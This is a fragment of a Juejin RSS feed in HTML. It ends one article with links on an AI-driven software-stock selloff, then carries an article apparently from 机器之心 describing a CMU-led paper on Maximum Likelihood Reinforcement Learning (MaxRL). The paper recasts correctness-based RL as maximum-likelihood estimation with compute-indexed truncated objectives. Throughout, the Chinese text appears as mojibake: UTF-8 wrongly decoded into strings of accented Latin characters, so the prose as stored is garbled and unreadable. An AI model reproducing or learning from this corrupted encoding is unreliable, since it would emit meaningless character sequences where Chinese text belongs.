<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/840b925d3f3a4608926b406908bd7eb7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890633&amp;x-signature=uiE43w0WvaC1Mb33MiesLv4RUOg%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¦‚æ­¤æ¿€çƒˆçš„ç«äº‰ï¼Œæˆ–è®¸å¾ˆå¿«è¿˜ä¼šå‚¬ç”Ÿå‡ºæ›´åŠ å¼ºå¤§çš„ AI èƒ½åŠ›ï¼Ÿ</p>
<p>å‚è€ƒå†…å®¹ï¼š</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.cnn.com%2F2026%2F02%2F04%2Finvesting%2Fus-stocks-anthropic-software" target="_blank" title="https://www.cnn.com/2026/02/04/investing/us-stocks-anthropic-software" ref="nofollow noopener noreferrer">www.cnn.com/2026/02/04/â€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.forbes.com%2Fsites%2Ftylerroush%2F2026%2F02%2F04%2Fglobal-software-stock-selloff-oracle-adobe-more-fueled-by-anthropics-new-ai-tools%2F" target="_blank" title="https://www.forbes.com/sites/tylerroush/2026/02/04/global-software-stock-selloff-oracle-adobe-more-fueled-by-anthropics-new-ai-tools/" ref="nofollow noopener noreferrer">www.forbes.com/sites/tylerâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.reuters.com%2Fbusiness%2Fmedia-telecom%2Fglobal-software-stocks-hit-by-anthropic-wake-up-call-ai-disruption-2026-02-04%2F" target="_blank" title="https://www.reuters.com/business/media-telecom/global-software-stocks-hit-by-anthropic-wake-up-call-ai-disruption-2026-02-04/" ref="nofollow noopener noreferrer">www.reuters.com/business/meâ€¦</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.anthropic.com%2Fnews%2Fclaude-is-a-space-to-think" target="_blank" title="https://www.anthropic.com/news/claude-is-a-space-to-think" ref="nofollow noopener noreferrer">www.anthropic.com/news/claudeâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¼ºåŒ–å­¦ä¹ è¿œä¸æ˜¯æœ€ä¼˜ï¼ŒCMUåˆšåˆšæå‡ºæœ€å¤§ä¼¼ç„¶å¼ºåŒ–å­¦ä¹ ]]></title>    <link>https://juejin.cn/post/7603195960254201856</link>    <guid>https://juejin.cn/post/7603195960254201856</guid>    <pubDate>2026-02-05T10:04:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603195960254201856" data-draft-id="7603043152672669711" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¼ºåŒ–å­¦ä¹ è¿œä¸æ˜¯æœ€ä¼˜ï¼ŒCMUåˆšåˆšæå‡ºæœ€å¤§ä¼¼ç„¶å¼ºåŒ–å­¦ä¹ "/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,OpenAI"/> <meta itemprop="datePublished" content="2026-02-05T10:04:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æœºå™¨ä¹‹å¿ƒ"/> <meta itemprop="url" content="https://juejin.cn/user/1873223543167902"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¼ºåŒ–å­¦ä¹ è¿œä¸æ˜¯æœ€ä¼˜ï¼ŒCMUåˆšåˆšæå‡ºæœ€å¤§ä¼¼ç„¶å¼ºåŒ–å­¦ä¹ 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1873223543167902/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æœºå™¨ä¹‹å¿ƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T10:04:50.000Z" title="Thu Feb 05 2026 10:04:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨å¤§æ¨¡å‹æ—¶ä»£ï¼Œä»ä»£ç ç”Ÿæˆåˆ°æ•°å­¦æ¨ç†ï¼Œå†åˆ°è‡ªä¸»è§„åˆ’çš„ Agent ç³»ç»Ÿï¼Œå¼ºåŒ–å­¦ä¹ å‡ ä¹æˆäº†ã€Œæœ€åä¸€å…¬é‡Œã€çš„æ ‡å‡†é…ç½®ã€‚</p>
<p>ç›´è§‰ä¸Šï¼Œå¼€å‘è€…çœŸæ­£æƒ³è¦çš„å…¶å®å¾ˆç®€å•ï¼šè®©æ¨¡å‹æ›´æœ‰å¯èƒ½ç”Ÿæˆã€Œæ­£ç¡®è½¨è¿¹ã€ã€‚ä»æ¦‚ç‡è§’åº¦çœ‹ï¼Œè¿™ç­‰ä»·äºæœ€å¤§åŒ–æ­£ç¡®è¾“å‡ºçš„æ¦‚ç‡ï¼Œä¹Ÿå°±æ˜¯ç»å…¸çš„æœ€å¤§ä¼¼ç„¶ï¼ˆMaximum Likelihoodï¼‰ç›®æ ‡ã€‚</p>
<p>ç„¶è€Œï¼Œä¸€é¡¹æ¥è‡ª CMUã€æ¸…åå¤§å­¦ã€æµ™æ±Ÿå¤§å­¦ç­‰ç ”ç©¶æœºæ„çš„æœ€æ–°å·¥ä½œæŒ‡å‡ºäº†ä¸€ä¸ªé¢‡å…·é¢ è¦†æ€§çš„äº‹å®ï¼š</p>
<p>ç°å®ä¸­å¹¿æ³›ä½¿ç”¨çš„å¼ºåŒ–å­¦ä¹ ï¼Œå¹¶æ²¡æœ‰çœŸæ­£åœ¨åšæœ€å¤§ä¼¼ç„¶ä¼˜åŒ–ã€‚ä¸¥æ ¼çš„ç†è®ºåˆ†ææ˜¾ç¤ºï¼Œå¼ºåŒ–å­¦ä¹ åªæ˜¯åœ¨ä¼˜åŒ–æœ€å¤§ä¼¼ç„¶ç›®æ ‡çš„ä¸€é˜¶è¿‘ä¼¼Â â€”â€” è·ç¦»æˆ‘ä»¬ä»¥ä¸ºçš„æœ€ä¼˜è®­ç»ƒç›®æ ‡ï¼Œå…¶å®è¿˜å·®å¾—å¾ˆè¿œã€‚</p>
<p>æ­£æ˜¯åŸºäºè¿™ä¸€è§‚å¯Ÿï¼Œç ”ç©¶å›¢é˜Ÿå¯¹å¼ºåŒ–å­¦ä¹ çš„ç›®æ ‡å‡½æ•°è¿›è¡Œäº†é‡æ–°å®¡è§†ï¼Œæå‡ºäº†æœ€å¤§ä¼¼ç„¶å¼ºåŒ–å­¦ä¹ ï¼ˆMaximum Likelihood Reinforcement Learningï¼‰ï¼šå°†åŸºäºæ­£ç¡®æ€§çš„å¼ºåŒ–å­¦ä¹ é‡æ–°åˆ»ç”»ä¸ºä¸€ä¸ªæ½œå˜é‡ç”Ÿæˆçš„æœ€å¤§ä¼¼ç„¶é—®é¢˜ï¼Œè¿›ä¸€æ­¥å¼•å…¥ä¸€æ—ä»¥è®¡ç®—é‡ä¸ºç´¢å¼•çš„ç›®æ ‡å‡½æ•°ï¼Œä½¿è®­ç»ƒç›®æ ‡èƒ½å¤Ÿé€æ­¥é€¼è¿‘çœŸæ­£çš„æœ€å¤§ä¼¼ç„¶ä¼˜åŒ–ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cadc752b68a64997910e006f2fd7a8aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=%2F1DlYNvQCgEzdOjtGxgyI85ywxQ%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<ul>
<li>è®ºæ–‡æ ‡é¢˜ï¼šMaximum Likelihood Reinforcement Learning</li>
</ul>

<ul>
<li>è®ºæ–‡é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Farxiv.org%2Fabs%2F2602.02710" target="_blank" title="https://arxiv.org/abs/2602.02710" ref="nofollow noopener noreferrer">arxiv.org/abs/2602.02â€¦</a></li>
<li>é¡¹ç›®åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fzanette-labs.github.io%2FMaxRL%2F" target="_blank" title="https://zanette-labs.github.io/MaxRL/" ref="nofollow noopener noreferrer">zanette-labs.github.io/MaxRL/</a></li>
</ul>

<ul>
<li>Github åœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ftajwarfahim%2Fmaxrl" target="_blank" title="https://github.com/tajwarfahim/maxrl" ref="nofollow noopener noreferrer">github.com/tajwarfahimâ€¦</a></li>
</ul>
<p>ä¼ ç»Ÿå¼ºåŒ–å­¦ä¹ çš„ã€Œå¡è„–å­ã€é—®é¢˜</p>
<p>åœ¨ä»£ç ç”Ÿæˆã€æ•°å­¦æ¨ç†ã€å¤šæ­¥å†³ç­–è¿™äº›ä»»åŠ¡ä¸­ï¼Œæˆ‘ä»¬å·²ç»å½¢æˆäº†ä¸€ç§å‡ ä¹é»˜è®¤çš„å…±è¯†ï¼šåªè¦åé¦ˆæ˜¯äºŒå€¼çš„ã€è¿‡ç¨‹æ˜¯ä¸å¯å¾®çš„ï¼Œå°±ç”¨å¼ºåŒ–å­¦ä¹ ã€‚</p>
<p>å¼ºåŒ–å­¦ä¹ è¿™å¥—èŒƒå¼ï¼Œæ”¯æ’‘äº†ä» AlphaGo åˆ°å¤§è¯­è¨€æ¨¡å‹æ¨ç†èƒ½åŠ›æå‡çš„ä¸€ç³»åˆ—å…³é”®è¿›å±•ã€‚</p>
<p>ä»ç«¯åˆ°ç«¯çš„è§’åº¦çœ‹ï¼Œå¼ºåŒ–å­¦ä¹ å°±æ˜¯ç»™å®šä¸€ä¸ªè¾“å…¥ï¼Œæ¨¡å‹éšå¼åœ°è¯±å¯¼å‡ºä¸€ä¸ªã€ŒæˆåŠŸæ¦‚ç‡ã€. å¦‚æœä¸è€ƒè™‘å¯å¾®æ€§çº¦æŸï¼Œæœ€è‡ªç„¶ã€ä¹Ÿæœ€åŸåˆ™æ€§çš„ç›®æ ‡ï¼Œå°±æ˜¯æœ€å¤§ä¼¼ç„¶ã€‚</p>
<p>ä½†è®ºæ–‡ç ”ç©¶å›¢é˜Ÿå‘ç°ï¼šåŸºäºæœŸæœ›å¥–åŠ±çš„å¼ºåŒ–å­¦ä¹ ï¼Œå…¶å®åªæ˜¯åœ¨ä¼˜åŒ–æœ€å¤§ä¼¼ç„¶ç›®æ ‡çš„ä¸€é˜¶è¿‘ä¼¼ã€‚æ›´å…·ä½“åœ°è¯´ï¼Œæœ€å¤§ä¼¼ç„¶ç›®æ ‡åœ¨æ€»ä½“å±‚é¢å¯ä»¥å±•å¼€ä¸ºä¸€ç³»åˆ—ä»¥ pass@k äº‹ä»¶ä¸ºåŸºçš„é¡¹ï¼Œè€Œæ ‡å‡†å¼ºåŒ–å­¦ä¹ åªä¼˜åŒ–äº†å…¶ä¸­çš„ä¸€é˜¶é¡¹ã€‚</p>
<p>ç®€å•æ¥è¯´ï¼Œå¼ºåŒ–å­¦ä¹ å¹¶æ²¡æœ‰çœŸæ­£æœ€å¤§åŒ–ã€Œæ¨¡å‹ç”Ÿæˆæ­£ç¡®ç­”æ¡ˆçš„æ¦‚ç‡ã€ï¼Œè€Œæ˜¯åœ¨ä¼˜åŒ–ä¸€ä¸ªä¸çœŸå®ä¼¼ç„¶å­˜åœ¨ç³»ç»Ÿæ€§åå·®çš„æ›¿ä»£ç›®æ ‡ã€‚</p>
<p>è¿™ä¹Ÿè§£é‡Šäº†ä¸€ä¸ªå¹¿æ³›å­˜åœ¨å´éš¾ä»¥è¨€è¯´çš„ç°è±¡ï¼šå¼ºåŒ–å­¦ä¹ æ—©æœŸè¿›å±•è¿…é€Ÿï¼Œä½†è¶Šåˆ°åæœŸï¼Œæ€§èƒ½æå‡è¶Šå›°éš¾ã€‚</p>
<p>ç ”ç©¶å›¢é˜Ÿé’ˆå¯¹è¿™ä¸€æ–°å‘ç°ï¼Œå¯¹ã€ŒåŸºäºæ­£ç¡®æ€§åé¦ˆçš„å¼ºåŒ–å­¦ä¹ ã€è¿›è¡Œäº†é‡æ–°åˆ»ç”»ï¼Œè®ºæ–‡çš„ä¸»è¦è´¡çŒ®å¦‚ä¸‹ï¼š</p>
<ul>
<li>
<p>å°†åŸºäºæ­£ç¡®æ€§çš„å¼ºåŒ–å­¦ä¹ å½¢å¼åŒ–ä¸ºä¸€ä¸ªæ½œå˜é‡ç”Ÿæˆçš„æœ€å¤§ä¼¼ç„¶é—®é¢˜ï¼Œå¹¶è¯æ˜æ ‡å‡†å¼ºåŒ–å­¦ä¹ ä»…ä¼˜åŒ–äº†æœ€å¤§ä¼¼ç„¶ç›®æ ‡çš„ä¸€é˜¶è¿‘ä¼¼ã€‚</p>
</li>
<li>
<p>æå‡ºäº†ä¸€æ—ä»¥è®¡ç®—é‡ä¸ºç´¢å¼•çš„ç›®æ ‡å‡½æ•°ï¼Œé€šè¿‡å¯¹ pass@k äº‹ä»¶è¿›è¡Œ Maclaurin å±•å¼€ï¼Œåœ¨æœŸæœ›å›æŠ¥ä¸ç²¾ç¡®æœ€å¤§ä¼¼ç„¶ä¹‹é—´å®ç°è¿ç»­æ’å€¼ã€‚</p>
</li>
<li>
<p>æ¨å¯¼å‡ºä¸€ç§ç®€å•çš„Â on-policy ä¼°è®¡å™¨ï¼Œå…¶æœŸæœ›æ¢¯åº¦ä¸è¯¥è®¡ç®—é‡ç´¢å¼•çš„ä¼¼ç„¶è¿‘ä¼¼ç›®æ ‡å®Œå…¨ä¸€è‡´ï¼Œè¿™æ„å‘³ç€å¢åŠ é‡‡æ ·çœŸæ­£æ”¹å–„äº†è¢«ä¼˜åŒ–çš„ç›®æ ‡æœ¬èº«ã€‚</p>
</li>
</ul>
<p>æœ€å¤§ä¼¼ç„¶ï¼šçœŸæ­£æ”¹è¿›ä¼˜åŒ–ç›®æ ‡</p>
<p>ç ”ç©¶å›¢é˜Ÿè®¤ä¸ºï¼Œæœ€å¤§ä¼¼ç„¶ä¼°è®¡åœ¨æœ‰ç›‘ç£å­¦ä¹ ä¸­è¡¨ç°å“è¶Šï¼Œä¸ºä»€ä¹ˆä¸ç›´æ¥åœ¨å¼ºåŒ–å­¦ä¹ ä¸­å®ç°å®ƒï¼Ÿ</p>
<p>ä¸Šä¸€èŠ‚ä¸­çš„è§‚å¯Ÿå¯ç¤ºæˆ‘ä»¬ï¼šå¯ä»¥æ„é€ ä¸€ä¸ªéšè®¡ç®—é‡å˜åŒ–çš„ç›®æ ‡å‡½æ•°æ—ï¼Œé€æ­¥å¼•å…¥æ›´é«˜é˜¶é¡¹ï¼›éšç€å¯ç”¨è®¡ç®—èµ„æºçš„å¢åŠ ï¼Œè¯¥ç›®æ ‡å‡½æ•°æ—å°†é€æ¸æ”¶æ•›åˆ°å®Œæ•´çš„æœ€å¤§ä¼¼ç„¶ç›®æ ‡ã€‚</p>
<p>è®ºæ–‡é€šè¿‡ä¸€ç³»åˆ—æ¨å¯¼ï¼Œå°†æœ€å¤§ä¼¼ç„¶ç›®æ ‡åœ¨å¤±è´¥äº‹ä»¶æ–¹é¢è¿›è¡Œéº¦å…‹åŠ³æ—å±•å¼€ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15027dfab74c467cac185924ae21de27~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=lAGOOmUFD8QA5F%2FRj42aR5qxS5E%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å±•å¼€å¼ä¸­çš„æœ€å¤§ä¼¼ç„¶æ¢¯åº¦å¾ˆéš¾ç”¨æœ‰é™æ ·æœ¬è¿›è¡Œä¼°è®¡ã€‚</p>
<p>ç‰¹åˆ«æ˜¯ï¼Œä¼°è®¡å¤§ k å€¼çš„ pass@k æ¢¯åº¦éœ€è¦è¶Šæ¥è¶Šå¤šçš„æ ·æœ¬ï¼Œå°¤å…¶æ˜¯åœ¨é€šè¿‡ç‡ p å¾ˆå°çš„æƒ…å†µä¸‹ã€‚è¿™ç§æœ‰é™æ ·æœ¬çš„å›°éš¾æ­£æ˜¯æå‡ºæœ€å¤§ä¼¼ç„¶å¼ºåŒ–å­¦ä¹ ï¼ˆMaxRLï¼‰çš„åŠ¨æœºæ‰€åœ¨ã€‚</p>
<p>ç ”ç©¶å›¢é˜Ÿå°† MaxRL å®šä¹‰ä¸ºä¸€ç±»å¼ºåŒ–å­¦ä¹ æ–¹æ³•ï¼Œå®ƒä»¬æ˜¾å¼åœ°ä»¥æœ€å¤§ä¼¼ç„¶ä¸ºç›®æ ‡ï¼Œè€Œä¸æ˜¯ä»¥é€šè¿‡ç‡ä¸ºç›®æ ‡ï¼ŒåŒæ—¶åœ¨æœ‰é™é‡‡æ ·å’Œä¸å¯å¾®ç”Ÿæˆçš„æ¡ä»¶ä¸‹ä»ç„¶å¯å®ç°ã€‚ä¸‹é¢æˆ‘ä»¬è€ƒè™‘ä¸€ç§å®ç°è¯¥ç›®æ ‡çš„åŸåˆ™æ€§æ–¹æ³•ã€‚</p>
<p>è€ƒè™‘é€šè¿‡å°†éº¦å…‹åŠ³æ—å±•å¼€å¼æˆªæ–­ä¸ºæœ‰é™é˜¶æ¥è¿‘ä¼¼æœ€å¤§ä¼¼ç„¶ç›®æ ‡ï¼Œç„¶åä¼°è®¡è¯¥ç›®æ ‡ã€‚å¯¹äºæˆªæ–­çº§åˆ« T âˆˆNï¼Œæˆ‘ä»¬å°†å›ºå®šè¾“å…¥ x çš„æˆªæ–­æœ€å¤§ä¼¼ç„¶ç›®æ ‡å®šä¹‰ä¸ºï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e8ca76c3e1d4db5bdfbfbd82f61d074~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=pBlEMp4SQ%2FpWa46MRp2VY8wgquk%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å¯¹å…¶æ±‚å¯¼å¾—åˆ°æˆªæ–­çš„æ€»ä½“æ¢¯åº¦ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ea431e17eb243179a0bd55880585190~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=O3kyfBpNpRJ7QHeutjdMaIu2MK8%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™å®šä¹‰äº†ä¸€æ—ç›®æ ‡å‡½æ•°ï¼šT = 1 è¿˜åŸä¸ºå¼ºåŒ–å­¦ä¹ ï¼ŒT â†’ âˆ è¿˜åŸä¸ºæœ€å¤§ä¼¼ç„¶ï¼Œä¸­é—´çš„ T å€¼åˆ™åœ¨ä¸¤è€…ä¹‹é—´æ’å€¼ã€‚å› æ­¤ï¼Œæˆªæ–­çº§åˆ« T ç›´æ¥æ§åˆ¶äº†æœ‰åŠ©äºå­¦ä¹ çš„æ­£ç¡®æ€§äº‹ä»¶çš„é˜¶æ•°ã€‚éšç€åœ¨ rollout æ–¹é¢æ¶ˆè€—æ›´å¤šçš„è®¡ç®—é‡ï¼Œå¯¹æ›´é«˜é˜¶æ¢¯åº¦çš„ä¼°è®¡å˜å¾—å¯è¡Œã€‚</p>
<p>æ¢å¥è¯è¯´ï¼š MaxRL æä¾›äº†ä¸€ä¸ªåŸåˆ™æ€§æ¡†æ¶ï¼Œç”¨äºé€šè¿‡å¢åŠ è®¡ç®—é‡æ¥æ¢å–å¯¹æœ€å¤§ä¼¼ç„¶ç›®æ ‡æ›´é«˜ä¿çœŸåº¦çš„è¿‘ä¼¼ã€‚</p>
<p>ä¸Šè¿°å…¬å¼å·²ç»ç»™å‡ºäº†ä¸€ç§å¯è¡Œçš„æ— åä¼°è®¡æ€è·¯ï¼šåˆ©ç”¨Â pass@k æ¢¯åº¦ä¼°è®¡å™¨ï¼Œå¯¹æœ‰é™çº§æ•°ä¸­çš„æ¯ä¸€é¡¹åˆ†åˆ«è¿›è¡Œè¿‘ä¼¼ã€‚åœ¨è¿™ä¸€ç­–ç•¥ä¸‹ï¼Œä»»ä½•å¯¹ pass@k ä¼°è®¡å™¨çš„æ”¹è¿›ï¼Œéƒ½ä¼šç›´æ¥è½¬åŒ–ä¸ºå¯¹æˆªæ–­æœ€å¤§ä¼¼ç„¶ç›®æ ‡çš„æ›´ä¼˜æ¢¯åº¦ä¼°è®¡ã€‚</p>
<p>ä¸è¿‡ï¼Œåœ¨æœ¬ç¯‡è®ºæ–‡ä¸­ï¼Œç ”ç©¶è€…é‡‡å–äº†ä¸€æ¡ä¸åŒçš„è·¯å¾„ï¼Œå°†å¸¦æ¥æ›´ä¸ºç®€æ´çš„ä¼°è®¡å™¨å½¢å¼ï¼ŒåŒæ—¶ä¹Ÿæä¾›äº†ä¸€ä¸ªæ–°çš„ç†è§£è§†è§’ã€‚</p>
<p>æœ€å¤§ä¼¼ç„¶ç›®æ ‡çš„æ¢¯åº¦å¯ä»¥å†™æˆå¦‚ä¸‹çš„æ¡ä»¶æœŸæœ›å½¢å¼ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/891a414064c147ccbbb4f59745c8a76e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5py65Zmo5LmL5b-D:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770890690&amp;x-signature=6MKa78EYG9VNMG1pPjbRnuCtC38%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¯¥å®šç†è¡¨æ˜ï¼Œæœ€å¤§ä¼¼ç„¶æ¢¯åº¦ç­‰ä»·äºä»…å¯¹æˆåŠŸè½¨è¿¹çš„æ¢¯åº¦è¿›è¡Œå¹³å‡ã€‚è¿™ä¸€è§£é‡Šä¸ºæ„é€ å…·ä½“çš„æ¢¯åº¦ä¼°è®¡å™¨æä¾›äº†ç›´æ¥é€”å¾„ï¼šåªéœ€ç”¨é‡‡æ ·å¾—åˆ°çš„æˆåŠŸè½¨è¿¹ï¼Œå¯¹ä¸Šè¿°æ¡ä»¶æœŸæœ›è¿›è¡Œæ ·æœ¬å¹³å‡å³å¯ã€‚</p>
<p>å…¶æ ¸å¿ƒæ´è§åœ¨äºï¼šæœ€å¤§ä¼¼ç„¶ç›®æ ‡çš„æ¢¯åº¦å¯ä»¥è¡¨ç¤ºä¸ºåœ¨ã€ŒæˆåŠŸæ¡ä»¶åˆ†å¸ƒã€ä¸‹çš„æœŸæœ›ã€‚</p>
